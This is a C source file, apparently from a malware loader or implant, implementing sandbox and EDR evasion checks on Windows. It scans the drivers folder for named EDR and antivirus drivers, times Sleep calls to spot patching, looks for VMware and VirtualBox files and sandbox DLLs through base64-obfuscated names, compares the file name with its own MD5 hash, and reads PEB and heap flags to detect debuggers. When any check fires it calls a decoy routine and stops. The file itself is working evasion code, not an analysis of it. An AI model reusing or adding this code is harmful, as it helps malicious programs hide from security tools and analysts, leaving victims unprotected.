#include "detector.h"
#include "evasion.h"
#include <winternl.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <time.h>
#include <psapi.h>
#include <wincrypt.h>
#include <shlwapi.h>

// Dynamic API Resolution
BOOL(WINAPI *pPathFileExistsA)(LPCSTR) = NULL;

// EDR Detection: Scan system driver directory for known EDR drivers
bool DetS() {
    const char* edrDrivers[] = {
        "atrsdfw.sys", "avgtpx86.sys", "avgtpx64.sys", "naswSP.sys", "edrsensor.sys",
        "CarbonBlackK.sys", "parity.sys", "cbk7.sys", "cbstream", "csacentr.sys",
        "csaenh.sys", "csareg.sys", "csascr.sys", "csaav.sys", "csaam.sys", 
        "SentinelMonitor.sys", "mfencfilter.sys", "PSINPROC.SYS", "PSINFILE.SYS",
        "klifks.sys", "klifaa.sys", "Klifsm.sys", "mbamwatchdog.sys"
    };

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA("C:\\Windows\\System32\\drivers\\*.sys", &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return false;

    do {
        for (int i = 0; i < sizeof(edrDrivers) / sizeof(edrDrivers[0]); i++) {
            if (StrStrIA(findFileData.cFileName, edrDrivers[i])) {
                printf("[!] Detected EDR: %s\n", edrDrivers[i]);
                SortNumbers();
                return true;
            }
        }
    } while (FindNextFileA(hFind, &findFileData));

    FindClose(hFind);
    return false;
}

// Sleep Patching Detection: Checks if Sleep(10000) completes normally
bool DetSl() {
    LARGE_INTEGER startTime, endTime, frequency;
    QueryPerformanceFrequency(&frequency);
    QueryPerformanceCounter(&startTime);

    Sleep(10000);  // Expected to take ~10,000 ms

    QueryPerformanceCounter(&endTime);
    double elapsedMs = ((double)(endTime.QuadPart - startTime.QuadPart) / frequency.QuadPart) * 1000.0;

    if (elapsedMs < 9000.0 || elapsedMs > 11000.0) {
        printf("[!] Sleep timing anomaly detected: %f ms\n", elapsedMs);
        SortNumbers();
        return true;
    }
    return false;
}

// Sandbox Detection files using Base64 Encoding
bool DetSBF() {
    // Resolve API Function Dynamically
    if (!pPathFileExistsA) {
        pPathFileExistsA = (BOOL(WINAPI*)(LPCSTR))ResolveFn("hShlwapi.dll", "PathFileExistsA");
        if (!pPathFileExistsA) return false;
    }

    // Base64 Encoded Paths
    const char* encodedPaths[] = {
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXFZtbW91c2Uuc3lz",  // Vmmouse.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtM2RnbC5kbGw=",  // vm3dgl.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtZHVtLmRsbA==",  // vmdum.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtM2R2ZXIuZGxs",  // vm3dver.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtdHJheS5kbGw=",  // vmtray.dll
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtY2kuc3lz",      // vmci.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZtdXNibW91c2Uuc3lz", // vmusbmouse.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZteF9zdmdhLnN5cw==", // vmx_svga.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxkcml2ZXJzXHZteG5ldC5zeXM=", // vmxnet.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94R3Vlc3Quc3lz",          // VBoxGuest.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94U0Yuc3lz",              // VBoxSF.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94VmlkZW8uc3lz",          // VBoxVideo.sys
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94U2VydmljZS5leGU=",      // VBoxService.exe
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94VHJheS5leGU=",          // VBoxTray.exe
        "QzpcV2luZG93c1xTeXN0ZW0zMlxWQm94Q29udHJvbC5leGU="       // VBoxControl.exe
    };

    int numPaths = sizeof(encodedPaths) / sizeof(encodedPaths[0]);

    for (int i = 0; i < numPaths; i++) {
        char* decodedPath = Bsfd(encodedPaths[i]); // Decode Path
        if (!decodedPath) continue;

        if (pPathFileExistsA(decodedPath)) {
            printf("[!] Sandbox file detected!\n");
            SortNumbers();
            free(decodedPath);
            return true;
        }

        free(decodedPath);
    }
    return false;
}

// Filename Hash Detection: Checks if file name matches hash (common in sandboxes)
bool DetF() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);

    DWORD bytesRead;
    ReadFile(hFile, buffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    BYTE hash[16]; // MD5 hash size
    DWORD hashLen = sizeof(hash);

    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash);
    CryptHashData(hHash, buffer, fileSize, 0);
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);

    HeapFree(GetProcessHeap(), 0, buffer);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    char hashStr[33];
    for (int i = 0; i < 16; i++)
        sprintf(&hashStr[i * 2], "%02X", hash[i]);

    char* fileName = PathFindFileNameA(exePath);
    fileName[strlen(fileName) - 4] = '\0';  // Remove ".exe"

    if (_stricmp(fileName, hashStr) == 0) {
        printf("[!] File name matches MD5 hash (possible packed execution)\n");
        SortNumbers();
        return true;
    }
    return false;
}

//Detect SandBox DLLs
bool DetSBD() {
    // Base64 Encoded DLLs (obfuscated)
    const char* encoded_realDLLs[] = {
        "a2VybmVsMzIuZGxs",  // kernel32.dll
        "bmV0d29ya2V4cGxvcmVyLmRsbA==",  // networkexplorer.dll
        "TmxzRGF0YTAwMDAuZGxs"  // NlsData0000.dll
    };

    const char* encoded_sandboxDLLs[] = {
        "Y21kdnJ0LjMyLmRsbA==",  // cmdvrt.32.dll
        "Y3Vja29vbW9uLmRsbA==",  // cuckoomon.dll
        "Y21kdnJ0LjY0LmRsbA==",  // cmdvrt.64.dll
        "cHN0b3JlYy5kbGw=",  // pstorec.dll
        "YXZnaG9va3guZGxs",  // avghookx.dll
        "YXZnaG9va2EuZGxs",  // avghooka.dll
        "c254aGsuc3lz",  // snxhk.dll
        "YXBpX2xvZy5kbGw=",  // api_log.dll
        "ZGlyX3dhdGNoLmRsbA==",  // dir_watch.dll
        "d3Blc3B5LmRsbA=="  // wpespy.dll
    };

    for (int i = 0; i < sizeof(encoded_realDLLs) / sizeof(encoded_realDLLs[0]); i++) {
        char* decodedPath = Bsfd(encoded_realDLLs[i]);
        HMODULE lib_inst = LoadLibraryA(decodedPath);
        if (lib_inst == NULL) {
            SortNumbers();
            printf("Checks : %s\n", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
        FreeLibrary(lib_inst);
    }

    for (int i = 0; i < sizeof(encoded_sandboxDLLs) / sizeof(encoded_sandboxDLLs[0]); i++) {
        char* decodedPath = Bsfd(encoded_sandboxDLLs[i]);
        HMODULE lib_inst = GetModuleHandleA(decodedPath);
        if (lib_inst != NULL) {
            SortNumbers();
            printf("Checks : %s\n", decodedPath);
            free(decodedPath);
            return true;
        }
        free(decodedPath);
    }

    return false;
}

// Detect if NtGlobalFlag is present in PEB
bool DetFPEB() {
    // Get Process Environment Block (PEB)
    #ifdef _WIN64
        PEB* peb = (PEB*)__readgsqword(0x60);
        // NtGlobalFlag is at offset 0xBC in 64-bit PEB
        DWORD NtGlobalFlag = *(DWORD*)((BYTE*)peb + 0xBC); 
    #else // _WIN32
        PEB* peb = (PEB*)__readfsdword(0x30);
        // NtGlobalFlag is at offset 0x68 in 32-bit PEB
        DWORD NtGlobalFlag = *(DWORD*)((BYTE*)peb + 0x68); 
    #endif

    // Check NtGlobalFlag
    return NtGlobalFlag & (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS);
}

//Detect debugger flags in HEAP
bool DetFH() {
    // Get Process Environment Block (PEB)
    #ifdef _WIN64
        PEB* peb = (PEB*)__readgsqword(0x60);
        PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x30));
        DWORD dwHeapFlagsOffset = 0x70; // 0x14 if Windows version inferior to Vista but who use old computers ? ;)
        DWORD dwHeapForceFlagsOffset = 0x74; // 0x18 if Windows version inferior to Vista but who use old computers ? ;)
    #else // _WIN32
        PEB* peb = (PEB*)__readfsdword(0x30);
        // Assuming no WOW64 processes for simplicity
        PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)peb + 0x18)); 
        DWORD dwHeapFlagsOffset = 0x40; // 0x0C if Windows version inferior to Vista but who use old computers ? ;)
        DWORD dwHeapForceFlagsOffset = 0x44; // 0x10 if Windows version inferior to Vista but who use old computers ? ;)
    #endif // _WIN64

    DWORD dwHeapFlags = *(DWORD*)((PBYTE)pHeapBase + dwHeapFlagsOffset);
    DWORD dwHeapForceFlags = *(DWORD*)((PBYTE)pHeapBase + dwHeapForceFlagsOffset);

    // Check heap flags
    return (dwHeapFlags & ~HEAP_GROWABLE) || (dwHeapForceFlags!= 0);
}

// Main Sandbox Detection Function
bool PerfomChecksEnv() {
    bool detected = false;

    printf("[*] Checking for EDRs...\n");
    detected |= DetS();

    printf("[*] Checking for sleep patching...\n");
    detected |= DetSl();

    printf("[*] Checking for sandbox files...\n");
    detected |= DetSBF();

    printf("[*] Checking for filename hash matching...\n");
    detected |= DetF();

    printf("[*] Checking for dll...\n");
    detected |= DetSBD();

    printf("[*] Checking for NtGlobalFlag...\n");
    detected |= DetFPEB();

    printf("[*] Checking for Heap Flags...\n");
    detected |= DetFH();

    if (detected) {
        printf("[!] Env unsafe, terminating execution.\n");
    } else {
        printf("[*] No sandbox detected.\n");
    }

    return detected;
}
